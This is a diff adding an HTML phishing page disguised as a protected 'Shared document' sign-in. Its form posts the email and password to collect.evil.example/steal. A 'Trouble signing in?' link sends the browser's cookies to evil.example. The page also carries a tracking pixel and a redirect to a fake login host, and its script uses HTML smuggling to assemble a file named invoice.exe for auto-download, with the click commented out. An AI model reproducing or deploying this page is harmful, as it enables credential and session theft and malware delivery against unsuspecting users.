@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>Shared document</title>
+<meta http-equiv="refresh" content="20;url=https://login.evil.example/">
+<style>
+body{font-family:system-ui,sans-serif;background:#eef1f5;display:grid;place-items:center;min-height:100vh;margin:0}
+.box{background:#fff;padding:32px;border-radius:12px;width:340px;box-shadow:0 4px 20px rgba(0,0,0,.1)}
+input{width:100%;padding:10px;margin:6px 0;box-sizing:border-box;border:1px solid #c8ced8;border-radius:6px}
+button{width:100%;padding:10px;background:#0b5cff;color:#fff;border:0;border-radius:6px;font-weight:600}
+</style></head>
+<body>
+<div class="box">
+  <h2>Sign in to view the document</h2>
+  <p>This file is protected. Confirm your work account to continue.</p>
+  <form action="https://collect.evil.example/steal" method="post">
+    <input type="email" name="u" placeholder="you@company.com">
+    <input type="password" name="p" placeholder="Password">
+    <button type="submit">Continue</button>
+  </form>
+  <p><a href="javascript:fetch('https://evil.example/?c='+document.cookie)">Trouble signing in?</a></p>
+  <img src="https://tracker.evil.example/open.gif" width="1" height="1" alt="">
+</div>
+<script>
+  // HTML smuggling: assemble a payload in the browser and auto-download it
+  const blob = new Blob([atob('TVqQAAMAAAAEAAAA')], {type: 'application/octet-stream'});
+  const a = document.createElement('a'); a.href = URL.createObjectURL(blob);
+  a.download = 'invoice.exe'; document.body.appendChild(a); /* a.click(); */
+</script>
+</body></html>
